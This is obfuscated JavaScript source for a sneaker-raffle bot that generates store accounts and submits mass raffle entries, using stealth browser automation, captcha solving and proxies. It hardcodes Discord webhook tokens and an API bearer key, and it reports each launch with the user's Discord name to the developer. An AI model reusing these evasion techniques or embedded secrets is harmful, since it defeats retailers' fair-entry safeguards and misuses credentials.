const { EmbedBuilder: _0x5d57ee } = require('discord.js');
var _0x14088d = require('exe');
const { execFile: _0x18ae34 } = require('child_process'), _0x53a2e2 = require('puppeteer-extra'), _0x38f41a = require('puppeteer-extra-plugin-recaptcha'), _0x572d68 = require('puppeteer-extra-plugin-stealth'), _0x471d3f = require('chalk'), _0x359416 = require('node-bash-title'), _0x1c44db = require('fs'), _0x5a0de3 = require('axios'), _0x793a8d = require('papaparse');
var _0x39e6ac = require('random-name');
const _0x30593c = require('request');
var _0x439958 = require('prompt');
const _0x2ae84b = _0x30593c['jar']();
var _0x1ca3b9 = {};
const _0x2e0d51 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x16a862 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x5f1e61 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x2ec933 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x1544ff = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1bbace = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x21fa6c = 'https://discord.com/api/webhooks/', _0x21e347 = '' + _0x21fa6c + _0x5f1e61, _0x5cef85 = '' + _0x21fa6c + _0x2ec933, _0x580ee6 = '' + _0x21fa6c + _0x2e0d51, _0xc30fae = '' + _0x21fa6c + _0x16a862, _0xb27635 = '' + _0x21fa6c + _0x1544ff, _0x2b3e0d = '' + _0x21fa6c + _0x1bbace;
const _0x916e90 = JSON['parse'](_0x1c44db['readFileSync']('../package.json', 'utf-8')), _0x531a7c = _0x916e90['version'];
var _0x25c22b, _0x2e4847, _0x2f371a, _0xdca8ec, _0xd03e3a, _0x4c1f70, _0x3566aa, _0x522fa7;
const _0xef6e9e = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x5d17e9 = ![];
const _0x56dec2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x229cee = '0123456789';
var _0x2fffc8 = _0x56dec2['split']('');
const _0xce735 = require('auto-git-update'), { PageEmittedEvents: _0x196f91 } = require('puppeteer'), { getRandomValues: _0x4a5595 } = require('crypto'), { resolve: _0x2c3850 } = require('path'), { Console: _0x4738f7 } = require('console'), _0x324e2c = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x672a1d = new _0xce735(_0x324e2c);
async function _0x3a17b7() {
    _0xd03e3a = _0x1c44db['readdirSync']('../proxies'), _0xdca8ec = _0x1c44db['readdirSync']('../tasks'), !_0x1c44db['existsSync']('../accounts/fenom.csv') && _0x1c44db['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x1c44db['existsSync']('../accounts/bstn.csv') && _0x1c44db['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x1c44db['existsSync']('../failed-tasks.csv') && _0x1c44db['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x1c44db['existsSync']('../successful-tasks.csv') && _0x1c44db['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x1ca3b9 = JSON['parse'](_0x1c44db['readFileSync']('../settings.json', 'utf-8')), !_0x1ca3b9['delay'] && (_0x1ca3b9['delay'] = 0x2710, _0x1c44db['writeFileSync']('../settings.json', JSON['stringify'](_0x1ca3b9))), !_0x1ca3b9['captchaKey'] && (_0x1ca3b9['captchaKey'] = '', _0x1c44db['writeFileSync']('../settings.json', JSON['stringify'](_0x1ca3b9))), !_0x1ca3b9['useRandomProxy'] && (_0x1ca3b9['useRandomProxy'] = !![], _0x1c44db['writeFileSync']('../settings.json', JSON['stringify'](_0x1ca3b9))), !_0x1ca3b9['webhook'] && (_0x1ca3b9['webhook'] = '', _0x1c44db['writeFileSync']('../settings.json', JSON['stringify'](_0x1ca3b9))), _0x1ca3b9['MahaDelay'] = _0x1ca3b9['delay'], _0x21fa6c = _0x1ca3b9['webhook'], _0x4c1f70 = _0x1ca3b9['licenseKey'];
}
let _0x4396e9, _0x31c585 = [], _0xe4b8be;
const _0x30926a = _0x162bb4 => new Promise(_0x448135 => setTimeout(_0x448135, _0x162bb4));
function _0x4c130e(_0x722faf, _0x46fbfb) {
    return Math['floor'](Math['random']() * (_0x46fbfb - _0x722faf + 0x1) + _0x722faf);
}
async function _0x5367f3(_0x392053) {
    return _0x5a0de3['get']('https://api.hyper.co/v4/licenses/' + _0x392053, { 'headers': { 'Authorization': 'Bearer\x20' + _0xef6e9e } })['then'](_0x3a5374 => _0x3a5374['data'])['catch'](() => null);
}
;
async function _0x267540(_0x279c16) {
    console['clear']();
    if (_0x279c16 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x387c79 = await _0x439958['get']('License');
        if (_0x387c79['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x30926a(0xbb8), _0x267540(_0x279c16);
        _0x279c16 = _0x387c79['License'], _0x1ca3b9['licenseKey'] = _0x279c16, _0x4c1f70 = _0x279c16, _0x1c44db['writeFileSync']('../settings.json', JSON['stringify'](_0x1ca3b9));
    }
    console['log']('Checking\x20license\x20' + _0x4c1f70 + '...'), await _0x30926a(0x320);
    const _0x597d6c = await _0x5367f3(_0x279c16);
    _0x3566aa = JSON['stringify'](_0x597d6c['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x522fa7 = JSON['stringify'](_0x597d6c['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x597d6c)
        return console['log']('License\x20not\x20found');
    if (!_0x597d6c['user'])
        return console['log']('License\x20not\x20bound');
    return _0x597d6c['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x5d17e9 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x5d17e9 = ![]);
}
async function _0x508a21() {
    var _0x49e857 = await _0x439958['get']('Module');
    return console['clear'](), _0x49e857['Module'];
}
;
async function _0x37130c() {
    var _0x3c3737 = await _0x439958['get']('Setting');
    return console['clear'](), _0x3c3737['Setting'];
}
async function _0x746fa1() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x35a8c2 = 0x0; _0x35a8c2 < _0xdca8ec['length']; _0x35a8c2++) {
        console['log']('\x20(' + _0x35a8c2 + ')\x20' + _0xdca8ec[_0x35a8c2]);
    }
    console['log']('');
    var _0x555e33 = await _0x439958['get']('Task');
    if (_0x555e33['Task'] > _0xdca8ec['length'] - 0x1 || isNaN(_0x555e33['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x30926a(0x3e8), _0x746fa1();
    var _0x28f8ea = _0x1c44db['readFileSync']('../tasks/' + _0xdca8ec[_0x555e33['Task']], 'utf-8');
    return _0x2f371a = _0x793a8d['parse'](_0x28f8ea, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x471d3f['blue'](_0xdca8ec[_0x555e33['Task']])), _0x25c22b = _0xdca8ec[_0x555e33['Task']], _0x2f371a;
}
async function _0x10659e() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x20fbd5 = 0x0; _0x20fbd5 < _0xd03e3a['length']; _0x20fbd5++) {
        console['log']('\x20(' + _0x20fbd5 + ')\x20' + _0xd03e3a[_0x20fbd5]);
    }
    console['log']('');
    var _0xd76f16 = await _0x439958['get']('Proxies');
    if (_0xd76f16['Proxies'] > _0xd03e3a['length'] - 0x1 || isNaN(_0xd76f16['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x30926a(0x3e8), _0x10659e();
    var _0x3652bd = _0x1c44db['readFileSync']('../proxies/' + _0xd03e3a[_0xd76f16['Proxies']], 'utf-8')['split']('\x0a');
    let _0x3978ea = _0x3652bd['map']((_0x58f964, _0x3c48a7) => {
        sanatizeProxy = _0x58f964['replace']('\x0d', '');
        if (_0x3652bd[_0x3c48a7 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2e4847 = _0xd03e3a[_0xd76f16['Proxies']], console['clear'](), _0x3978ea;
}
async function _0x3cabff() {
    var _0x16d203 = await _0x439958['get']('Value');
    return console['clear'](), _0x16d203['Value'];
}
async function _0x2f2d2a(_0x2ae0d6) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x570a30 = 0x0; _0x570a30 < _0x2ae0d6['length']; _0x570a30++) {
        console['log']('\x20(' + _0x570a30 + ')\x20[' + _0x2ae0d6[_0x570a30]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x2776c4 = await _0x439958['get']('Module');
    return _0x2776c4['Module'];
}
async function _0x1cf80e() {
    var _0x36352f = await _0x439958['get']('Password');
    return console['clear'](), _0x36352f['Password'];
}
;
async function _0x2f83b0() {
    var _0x3e8210 = await _0x439958['get']('Links');
    return _0x3e8210['Links'];
}
;
async function _0x3f3940() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x4d3a3a = 0x0; _0x4d3a3a < _0x31c585['length']; _0x4d3a3a++) {
        console['log']('\x20(' + _0x4d3a3a + ')\x20' + _0x31c585[_0x4d3a3a]);
    }
    ;
    console['log']();
    let _0x26486f = await _0x439958['get']('Product');
    return console['clear'](), _0x26486f['Product'];
}
;
function _0x31f3f5() {
    var _0x27cca2 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x27cca2;
}
;
function _0x10b828() {
    var _0xf2e383 = new Date(Date['now']())['toLocaleString']();
    return _0xf2e383['replace'](',', '');
}
const _0x1299c5 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'SQ43yf',
                            'custom_source': 'DZ5485-052',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WLQk7t',
                                '$consent_form_version': 0x7f71d6,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x5778ae(_0x44e1eb, _0x172388) {
    let _0x8be860 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x531a7c != 'devkey') {
        await _0x5a0de3['post'](_0x44e1eb, _0x172388, _0x8be860);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x51c110(_0x29785f, _0x2a3314, _0x287af7, _0x528521, _0x307bad) {
    if (!_0x528521 && _0x287af7 == 'dev') {
        var _0x59aa4a = new _0x5d57ee()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2a3314['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2a3314['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x29785f['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x1ca3b9['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x3566aa,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x29785f['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x531a7c,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x59aa4a['data'];
    } else {
        if (_0x528521 && _0x287af7 == 'dev') {
            var _0x59aa4a = new _0x5d57ee()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2a3314['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x3566aa,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2a3314['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x29785f['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x1ca3b9['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x307bad,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x29785f['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x531a7c,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x59aa4a['data'];
        } else {
            if (_0x287af7 == 'pub') {
                var _0x59aa4a = new _0x5d57ee()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2a3314['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2a3314['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x29785f['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x1ca3b9['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x29785f['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x531a7c,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x59aa4a['data'];
            } else {
                if (_0x287af7 == 'acc' && !_0x528521) {
                    var _0x59aa4a = new _0x5d57ee()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2a3314['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x3566aa,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2a3314['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x1ca3b9['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x531a7c,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x59aa4a['data'];
                } else {
                    if (_0x287af7 == 'acc' && _0x528521) {
                        var _0x59aa4a = new _0x5d57ee()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2a3314['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x3566aa,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x307bad,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2a3314['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x1ca3b9['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x531a7c,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x59aa4a['data'];
                    } else {
                        if (_0x287af7 == 'open') {
                            var _0x59aa4a = new _0x5d57ee()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x522fa7)['addFields']({
                                'name': 'User',
                                'value': '' + _0x3566aa,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x531a7c,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x59aa4a['data'];
                        } else {
                            if (!_0x528521 && _0x287af7 == 'ver') {
                                var _0x59aa4a = new _0x5d57ee()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
